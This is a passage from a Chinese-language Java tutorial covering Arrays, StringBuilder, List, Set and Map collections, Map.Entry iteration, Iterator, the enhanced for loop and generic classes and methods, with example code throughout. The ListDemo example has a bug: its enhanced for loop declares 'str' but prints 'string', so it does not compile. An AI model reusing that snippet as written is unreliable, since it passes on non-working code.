class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h1><blockquote>
<p>java.util.Arrays 此类包含用来操作数组的各种方法，比如排序和搜索等。其所有方法均为静态方法，调用起来 非常简单。</p>
</blockquote>
<h2 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h2><ul>
<li><code>public static String toString(int[] a)</code>：返回指定数组内容的字符串表示形式。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 定义int 数组</span></span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">2</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">4</span>,<span class="number">657</span>,<span class="number">8</span>,<span class="number">69</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="comment">// 打印数组,输出地址值</span></span><br><span class="line">System.out.println(arr); <span class="comment">// [I@2ac1fdc4</span></span><br><span class="line"><span class="comment">// 数组内容转为字符串</span></span><br><span class="line">String s = Arrays.toString(arr);</span><br><span class="line"><span class="comment">// 打印字符串,输出内容</span></span><br><span class="line">System.out.println(s); <span class="comment">// [2, 34, 35, 4, 657, 8, 69, 9]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>public static void sort(int[] a)</code>：对指定的 int 型数组按数字<strong>升序</strong>进行排序。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 定义int 数组</span></span><br><span class="line"><span class="keyword">int</span>[] arr = &#123;<span class="number">24</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">48</span>, <span class="number">4</span>, <span class="number">46</span>, <span class="number">35</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">2</span>&#125;;</span><br><span class="line">System.out.println(<span class="string">"排序前:"</span>+ Arrays.toString(arr)); <span class="comment">// 排序前:[24, 7, 5, 48, 4, 46, 35, 11, 6,</span></span><br><span class="line"><span class="number">2</span>]</span><br><span class="line"><span class="comment">// 升序排序</span></span><br><span class="line">Arrays.sort(arr);</span><br><span class="line">System.out.println(<span class="string">"排序后:"</span>+ Arrays.toString(arr));<span class="comment">// 排序后:[2, 4, 5, 6, 7, 11, 24, 35, 46,</span></span><br><span class="line"><span class="number">48</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="StringBuilder-类"><a href="#StringBuilder-类" class="headerlink" title="StringBuilder 类"></a>StringBuilder 类</h1><p>StringBuilder是个字符串的缓冲区，即它是一个容器，容器中可以装很多字符串。并且能够对其中的字符串进行各种操作。</p>
<p>它的内部拥有一个数组用来存放字符串内容，进行字符串拼接时，直接在数组中加入新内容。StringBuilder会自动维护数组的扩容，默认16字符空间，超过自动扩充。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  StringBuilder sb1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">  System.out.println(sb1); <span class="comment">// (空白)</span></span><br><span class="line">  <span class="comment">// 使用带参构造</span></span><br><span class="line">  StringBuilder sb2 = <span class="keyword">new</span> StringBuilder(<span class="string">"itcast"</span>);</span><br><span class="line">  System.out.println(sb2); <span class="comment">// itcast</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><p>StringBuilder常用的方法有2个：</p>
<ul>
<li><code>public StringBuilder append(...)</code>：添加任意类型数据的字符串形式，并返回当前对象自身。</li>
<li><code>public String toString()</code>：将当前StringBuilder对象转换为String对象。</li>
</ul>
<h3 id="append方法"><a href="#append方法" class="headerlink" title="append方法"></a>append方法</h3><p>append方法具有多种重载形式，可以接收任意类型的参数。任何数据作为参数都会将对应的字符串内容添加到StringBuilder中。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02StringBuilder</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//创建对象</span></span><br><span class="line">		StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="comment">//public StringBuilder append(任意类型)</span></span><br><span class="line">		StringBuilder builder2 = builder.append(<span class="string">"hello"</span>);</span><br><span class="line">		<span class="comment">//对比一下</span></span><br><span class="line">		System.out.println(<span class="string">"builder:"</span>+builder);</span><br><span class="line">		System.out.println(<span class="string">"builder2:"</span>+builder2);</span><br><span class="line">		System.out.println(builder == builder2); <span class="comment">//true</span></span><br><span class="line">	    <span class="comment">// 可以添加 任何类型</span></span><br><span class="line">		builder.append(<span class="string">"hello"</span>);</span><br><span class="line">		builder.append(<span class="string">"world"</span>);</span><br><span class="line">		builder.append(<span class="keyword">true</span>);</span><br><span class="line">		builder.append(<span class="number">100</span>);</span><br><span class="line">		<span class="comment">// 在我们开发中，会遇到调用一个方法后，返回一个对象的情况。然后使用返回的对象继续调用方法。</span></span><br><span class="line">    <span class="comment">//链式编程</span></span><br><span class="line">builder.append(<span class="string">"hello"</span>).append(<span class="string">"world"</span>).append(<span class="keyword">true</span>).append(<span class="number">100</span>);</span><br><span class="line">		System.out.println(<span class="string">"builder:"</span>+builder);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h3><p>通过toString方法，StringBuilder对象将会转换为不可变的String对象。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo16StringBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 链式创建</span></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="string">"Hello"</span>).append(<span class="string">"World"</span>).append(<span class="string">"Java"</span>);</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.println(str); <span class="comment">// HelloWorldJava</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>集合按照其存储结构可以分为两大类，分别是：</p>
<p>单列集合<code>java.util.Collection</code></p>
<p>双列集合<code>java.util.Map</code></p>
<h2 id="Collection集合"><a href="#Collection集合" class="headerlink" title="Collection集合"></a>Collection集合</h2><p>单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是：</p>
<ul>
<li><p><code>java.util.List</code></p>
</li>
<li><p><code>java.util.Set</code></p>
</li>
</ul>
<p>其中，<code>List</code>的特点是元素有序、元素可重复。</p>
<p><code>Set</code>的特点是元素无序，而且不可重复。</p>
<p><code>List</code>接口的主要实现类有<code>java.util.ArrayList</code>和<code>java.util.LinkedList</code>；</p>
<p><code>Set</code>接口的主要实现类有<code>java.util.HashSet</code>和<code>java.util.TreeSet</code>。</p>
<h3 id="Collection常用功能"><a href="#Collection常用功能" class="headerlink" title="Collection常用功能"></a>Collection常用功能</h3><p>Collection是所有单列集合的父接口，因此在Collection中定义了单列集合(List和Set)通用的一些方法，这些方法可用于操作所有的单列集合。方法如下：</p>
<ul>
<li><code>public boolean add(E e)</code>：  把给定的对象添加到当前集合中 </li>
<li><code>public void clear()</code> :清空集合中所有的元素</li>
<li><code>public boolean remove(E e)</code>: 把给定的对象在当前集合中删除</li>
<li><code>public boolean contains(E e)</code>: 判断当前集合中是否包含给定的对象</li>
<li><code>public boolean isEmpty()</code>: 判断当前集合是否为空</li>
<li><code>public int size()</code>: 返回集合中元素的个数</li>
<li><code>public Object[] toArray()</code>: 把集合中的元素，存储到数组中</li>
</ul>
<h3 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h3><p>java.util.List 接口继承自 Collection 接口，是单列集合的一个重要分支，习惯性地会将实现了 List 接口的对象称为List集合。</p>
<p>在List集合中允许出现重复的元素，所有的元素是以一种线性方式进行存储的，在程序中可以通过【索引】来访问集合中的指定元素。</p>
<p>另外，List集合还有一个特点就是元素有序，即元素的存入顺序和取出顺序一致。</p>
<h4 id="List常用方法"><a href="#List常用方法" class="headerlink" title="List常用方法"></a>List常用方法</h4><p>List作为Collection集合的子接口，不但继承了Collection接口中的全部方法，而且还增加了一些根据元素索引来操作集合的特有方法，如下：</p>
<p><code>public void add(int index, E element)</code> : 将指定的元素，添加到该集合中的指定位置上。</p>
<p><code>public E get(int index)</code>:返回集合中指定位置的元素。</p>
<p><code>public E remove(int index)</code>: 移除列表中指定位置的元素, 返回的是被移除的元素。 </p>
<p><code>public E set(int index, E element)</code>:用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 </p>
<p>List集合特有的方法都是跟索引相关：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建List集合对象</span></span><br><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"><span class="comment">// 往 尾部添加 指定元素</span></span><br><span class="line">list.add(<span class="string">"图图"</span>);</span><br><span class="line">list.add(<span class="string">"小美"</span>);</span><br><span class="line">list.add(<span class="string">"不高兴"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// add(int index,String s) 往指定位置添加</span></span><br><span class="line">list.add(<span class="number">1</span>,<span class="string">"没头脑"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String remove(int index) 删除指定位置元素 返回被删除元素</span></span><br><span class="line"><span class="comment">// 删除索引位置为2的元素</span></span><br><span class="line">System.out.println(<span class="string">"删除索引位置为2的元素"</span>);</span><br><span class="line">System.out.println(list.remove(<span class="number">2</span>));</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String set(int index,String s)</span></span><br><span class="line"><span class="comment">// 在指定位置 进行 元素替代（改）</span></span><br><span class="line"><span class="comment">// 修改指定位置元素</span></span><br><span class="line">list.set(<span class="number">0</span>, <span class="string">"三毛"</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"><span class="comment">// String get(int index) 获取指定位置元素</span></span><br><span class="line"><span class="comment">// 跟size() 方法一起用 来 遍历的</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">System.out.println(list.get(i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//还可以使用增强for</span></span><br><span class="line"><span class="keyword">for</span>(String str : list)&#123;</span><br><span class="line">  System.out.println(string);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h3><p>java.util.Set 接口和 java.util.List 接口一样，同样继承自 Collection 接口，它与 Collection 接口中的方法基本一致，并没有对 Collection 接口进行功能上的扩充，只是比 Collection 接口更加严格了。</p>
<p>与 List 接口不 同的是， Set 接口中元素【无序】，并且都会以某种规则保证存入的元素不出现重复。</p>
<h2 id="Map集合"><a href="#Map集合" class="headerlink" title="Map集合"></a>Map集合</h2><p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429182137690.png" alt="image-20200429182137690"></p>
<p>Collection 中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。</p>
<p>Map 中的集合，元素是成对存在的(理解为夫妻)。</p>
<p>每个元素由键与值两部分组成，通过键可以找对所对应的值。</p>
<p> Collection 中的集合称为单列集合， Map 中的集合称为双列集合。</p>
<p>需要注意的是， Map 中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。</p>
<h3 id="Map常用子类"><a href="#Map常用子类" class="headerlink" title="Map常用子类"></a>Map常用子类</h3><p>通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 </p>
<ul>
<li>HashMap：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。</li>
<li>LinkedHashMap：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的 hashCode()方法、equals()方法。 </li>
</ul>
<blockquote>
<p>tips：Map接口中的集合都有两个泛型变量,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量的数据类型可以相同，也可以不同。</p>
</blockquote>
<h3 id="Map接口常用方法"><a href="#Map接口常用方法" class="headerlink" title="Map接口常用方法"></a>Map接口常用方法</h3><p>Map接口中定义了很多方法，常用的如下： </p>
<p><code>public V put(K key, V value)</code>: 把指定的键与指定的值添加到Map集合中。 </p>
<p><code>public V remove(Object key)</code>: 把指定的键所对应的键值对元素在Map集合中删除，返回被删除元素的值。</p>
<p><code>public V get(Object key)</code>: 根据指定的键，在Map集合中获取对应的value。 </p>
<p><code>public Set&lt;k&gt; keySet()</code>: 获取Map集合中所有的键，存储到Set集合中。</p>
<p><code>public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code> : 获取到Map集合中所有的键值对对象的集合(Set集合)。</p>
<p>演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建 map对象</span></span><br><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"><span class="comment">//添加元素到集合</span></span><br><span class="line">map.put(<span class="string">"黄晓明"</span>, <span class="string">"杨颖"</span>);</span><br><span class="line">map.put(<span class="string">"文章"</span>, <span class="string">"马伊琍"</span>);</span><br><span class="line">map.put(<span class="string">"邓超"</span>, <span class="string">"孙俪"</span>);</span><br><span class="line">System.out.println(map);</span><br><span class="line"><span class="comment">//String remove(String key)</span></span><br><span class="line">System.out.println(map.remove(<span class="string">"邓超"</span>));</span><br><span class="line">System.out.println(map);</span><br><span class="line"><span class="comment">// 想要查看 黄晓明的媳妇 是谁</span></span><br><span class="line">System.out.println(map.get(<span class="string">"黄晓明"</span>));</span><br><span class="line">System.out.println(map.get(<span class="string">"邓超"</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tips: 使用put方法时，若指定的键(key)在集合中没有，则没有这个键对应的值，返回null，并把指定的键值添加到集合中； 若指定的键(key)在集合中存在，则返回值为集合中键对应的值（该值为替换前的值），并把指定键所对应的值，替换成指定的新值。</p>
</blockquote>
<h3 id="Entry-键值对对象"><a href="#Entry-键值对对象" class="headerlink" title="Entry 键值对对象"></a>Entry 键值对对象</h3><p>我们已经知道， Map 中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在 Map 中是一一对应关系，这一对对象又称做 Map 中的一个 Entry(项) 。</p>
<p>Entry 将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历 Map 集合时，就可以从每一个键值对（ Entry ）对象中获取对应的键与对应的值。 </p>
<p>既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： </p>
<p><code>public K getKey()</code>：获取Entry对象中的键。 </p>
<p><code>public V getValue()</code>：获取Entry对象中的值。 </p>
<p>在Map集合中也提供了获取所有Entry对象的方法： </p>
<p><code>public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code> : 获取到Map集合中所有的键值对对象的集合(Set集合)。</p>
<h3 id="Map集合遍历键值对的方式"><a href="#Map集合遍历键值对的方式" class="headerlink" title="Map集合遍历键值对的方式"></a>Map集合遍历键值对的方式</h3><p>键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 </p>
<p>操作步骤与图解： </p>
<ol>
<li>获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。entrySet() 。 </li>
<li>遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。</li>
<li>通过键值对(Entry)对象，获取Entry对象中的键与值。getKey()/getValue()</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapDemo02</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建Map集合对象</span></span><br><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"><span class="comment">// 添加元素到集合</span></span><br><span class="line">map.put(<span class="string">"胡歌"</span>, <span class="string">"霍建华"</span>);</span><br><span class="line">map.put(<span class="string">"郭德纲"</span>, <span class="string">"于谦"</span>);</span><br><span class="line">map.put(<span class="string">"薛之谦"</span>, <span class="string">"大张伟"</span>);</span><br><span class="line"><span class="comment">// 获取 所有的 entry对象 entrySet</span></span><br><span class="line">Set&lt;Entry&lt;String,String&gt;&gt; entrySet = map.entrySet();</span><br><span class="line"><span class="comment">// 遍历得到每一个entry对象</span></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry : entrySet) &#123;</span><br><span class="line"><span class="comment">// 解析</span></span><br><span class="line">String key = entry.getKey();</span><br><span class="line">String value = entry.getValue();</span><br><span class="line">System.out.println(key+<span class="string">"的CP是:"</span>+value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>图解：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200429190122568.png" alt="image-20200429190122568"></p>
<h1 id="Iterator迭代器"><a href="#Iterator迭代器" class="headerlink" title="Iterator迭代器"></a>Iterator迭代器</h1><p>在程序开发中，经常需要遍历集合中的所有元素。针对这种需求，JDK专门提供了一个接口<code>java.util.Iterator</code>。<code>Iterator</code>接口也是Java集合中的一员，但它与<code>Collection</code>、<code>Map</code>接口有所不同，<code>Collection</code>接口与<code>Map</code>接口主要用于存储元素，而<code>Iterator</code>主要用于迭代访问（即遍历）<code>Collection</code>中的元素，因此<code>Iterator</code>对象也被称为迭代器。</p>
<p>想要遍历Collection集合，那么就要获取该集合迭代器完成迭代操作，下面介绍一下获取迭代器的方法：</p>
<ul>
<li><code>public Iterator iterator()</code>: 获取集合对应的迭代器，用来遍历集合中的元素的。</li>
</ul>
<p>下面介绍一下迭代的概念：</p>
<ul>
<li><strong>迭代</strong>：即Collection集合元素的通用获取方式。在取元素之前先要判断集合中有没有元素，如果有，就把这个元素取出来，继续在判断，如果还有就再取出出来。一直把集合中的所有元素全部取出。这种取出方式专业术语称为迭代。</li>
</ul>
<p>Iterator接口的常用方法如下：</p>
<ul>
<li><code>public E next()</code>:返回迭代的下一个元素。</li>
<li><code>public boolean hasNext()</code>:如果仍有元素可以迭代，则返回 true。</li>
</ul>
<p>接下来通过案例学习如何使用Iterator迭代集合中元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IteratorDemo</span> </span>&#123;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使用多态方式 创建对象</span></span><br><span class="line">        Collection&lt;String&gt; coll = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加元素到集合</span></span><br><span class="line">        coll.add(<span class="string">"串串星人"</span>);</span><br><span class="line">        coll.add(<span class="string">"吐槽星人"</span>);</span><br><span class="line">        coll.add(<span class="string">"汪星人"</span>);</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="comment">//使用迭代器 遍历   每个集合对象都有自己的迭代器</span></span><br><span class="line">        Iterator&lt;String&gt; it = coll.iterator();</span><br><span class="line">        <span class="comment">//  泛型指的是 迭代出 元素的数据类型</span></span><br><span class="line">        <span class="keyword">while</span>(it.hasNext())&#123; <span class="comment">//判断是否有迭代元素</span></span><br><span class="line">            String s = it.next();<span class="comment">//获取迭代出的元素</span></span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现原理：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200428180357303.png" alt="image-20200428180357303"></p>
<p>在调用Iterator的next方法之前，迭代器的索引位于第一个元素之前，不指向任何元素，当第一次调用迭代器的next方法后，迭代器的索引会向后移动一位，指向第一个元素并将该元素返回，当再次调用next方法时，迭代器的索引会指向第二个元素并将该元素返回，依此类推，直到hasNext方法返回false，表示到达了集合的末尾，终止对元素的遍历。</p>
<h2 id="增强for"><a href="#增强for" class="headerlink" title="增强for"></a>增强for</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NBFor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line">    	Collection&lt;String&gt; coll = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    	coll.add(<span class="string">"小河神"</span>);</span><br><span class="line">    	coll.add(<span class="string">"老河神"</span>);</span><br><span class="line">    	coll.add(<span class="string">"神婆"</span>);</span><br><span class="line">    	<span class="comment">//使用增强for遍历</span></span><br><span class="line">    	<span class="keyword">for</span>(String s :coll)&#123;<span class="comment">//接收变量s代表 代表被遍历到的集合元素</span></span><br><span class="line">    		System.out.println(s);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Collection虽然可以存储各种对象，但实际上通常Collection只存储同一类型对象。例如都是存储字符串对象。因此在JDK5之后，新增了<strong>泛型</strong>(<strong>Generic</strong>)语法，让人们在设计API时可以指定类或方法支持泛型，这样我们使用API的时候也变得更为简洁，并得到了编译时期的语法检查。</p>
<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>例如，API中的ArrayList集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt;</span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123; &#125;</span><br><span class="line">   	....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用泛型： 即什么时候确定泛型。</p>
<p><strong>在创建对象的时候确定泛型</strong></p>
<p> 例如，<code>ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();</code></p>
<p>此时，变量E的值就是String类型,那么我们的类型就可以理解为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">String</span>&gt;</span>&#123; </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(String e)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;  &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时，变量E的值就是Integer类型,那么我们的类型就可以理解为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123; </span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(Integer e)</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> Integer <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;  &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="举例自定义泛型类"><a href="#举例自定义泛型类" class="headerlink" title="举例自定义泛型类"></a>举例自定义泛型类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericClass</span>&lt;<span class="title">MVP</span>&gt; </span>&#123;</span><br><span class="line">	<span class="comment">//没有MVP类型，在这里代表 未知的一种数据类型 未来传递什么就是什么类型</span></span><br><span class="line">	<span class="keyword">private</span> MVP mvp;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMVP</span><span class="params">(MVP mvp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.mvp = mvp;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> MVP <span class="title">getMVP</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mvp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericClassDemo</span> </span>&#123;</span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;		 </span><br><span class="line">         <span class="comment">// 创建一个泛型为String的类</span></span><br><span class="line">         MyGenericClass&lt;String&gt; my = <span class="keyword">new</span> MyGenericClass&lt;String&gt;();    	</span><br><span class="line">         <span class="comment">// 调用setMVP</span></span><br><span class="line">         my.setMVP(<span class="string">"大胡子登登"</span>);</span><br><span class="line">         <span class="comment">// 调用getMVP</span></span><br><span class="line">         String mvp = my.getMVP();</span><br><span class="line">         System.out.println(mvp);</span><br><span class="line">         <span class="comment">//创建一个泛型为Integer的类</span></span><br><span class="line">         MyGenericClass&lt;Integer&gt; my2 = <span class="keyword">new</span> MyGenericClass&lt;Integer&gt;(); </span><br><span class="line">         my2.setMVP(<span class="number">123</span>);   	  </span><br><span class="line">         Integer mvp2 = my2.getMVP();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="含有泛型的方法"><a href="#含有泛型的方法" class="headerlink" title="含有泛型的方法"></a>含有泛型的方法</h2><p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericMethod</span> </span>&#123;	  </span><br><span class="line">    <span class="keyword">public</span> &lt;MVP&gt; <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(MVP mvp)</span> </span>&#123;</span><br><span class="line">    	System.out.println(mvp.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> &lt;MVP&gt; <span class="function">MVP <span class="title">show2</span><span class="params">(MVP mvp)</span> </span>&#123;	</span><br><span class="line">    	<span class="keyword">return</span> mvp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用格式：<strong>调用方法时，确定泛型的类型</strong></p>
